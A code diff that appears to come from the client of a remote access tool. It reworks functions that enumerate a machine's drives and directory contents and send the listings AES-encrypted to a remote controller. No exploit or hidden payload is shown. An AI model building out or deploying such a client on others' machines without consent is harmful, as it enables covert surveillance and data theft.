@@ -7,6 +7,8 @@ import hashlib
 import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from pathlib import Path
+from datetime import datetime
 
 class EntryPoint:
     @staticmethod
@@ -168,31 +170,44 @@ class MainForm:
 
     def list_drives(self):
         try:
-            drives = [f"{drive}\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{drive}:\\")]
+            drives = [f"{drive}:\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{drive}:\\")]
             drives_string = "|".join(drives)
             self.send(self.AESEncrypt(f"Drives{drives_string}", self.encryption_key))
         except Exception as e:
-            print(f"Error in listDrives: {e}")
+            print(f"Error in list_drives: {e}")
+
 
     def show_files(self, path):
         try:
-            items = [path + "|"]
-            for root, dirs, files in os.walk(path):
-                for dir in dirs:
-                    dir_path = os.path.join(root, dir)
-                    items.append(f"{dir}|{os.path.getctime(dir_path)}|{os.path.getatime(dir_path)}||1")
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    items.append(f"{file}|{os.path.getctime(file_path)}|{os.path.getatime(file_path)}|{self.format_file_size(os.path.getsize(file_path))}|0")
-                break
-            items = "".join(items).strip()
-            self.send(self.AESEncrypt(f"FileManagerFiles{items}", self.encryption_key))
-        except Exception as e:
-            print(f"Error in showFiles: {e}")
+            items = f"{path}|"
 
-    def format_file_size(self, bytes):
-        size_in_mb = bytes / (1024 * 1024)
-        return f"{size_in_mb:.2f} MB"
+            # Get all directories
+            for entry in os.scandir(path):
+                if entry.is_dir():
+                    creation_time = datetime.fromtimestamp(entry.stat().st_ctime).isoformat()
+                    last_access_time = datetime.fromtimestamp(entry.stat().st_atime).isoformat()
+                    items += f"{entry.name}|{creation_time}|{last_access_time}||1\n"
+
+            # Get all files
+            for entry in os.scandir(path):
+                if entry.is_file():
+                    creation_time = datetime.fromtimestamp(entry.stat().st_ctime).isoformat()
+                    last_access_time = datetime.fromtimestamp(entry.stat().st_atime).isoformat()
+                    file_size = self.format_file_size(entry.stat().st_size)
+                    items += f"{entry.name}|{creation_time}|{last_access_time}|{file_size}|0\n"
+
+            items = items.strip()
+
+            self.send(self.AESEncrypt("FileManagerFiles" + items, self.encryption_key))
+        except Exception as e:
+            print(f"Error in show_files: {e}")
+
+
+    def format_file_size(self, size):
+        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+            if size < 1024.0:
+                return f"{size:.2f}{unit}"
+            size /= 1024.0
 
     def create_directory(self, path):
         try:
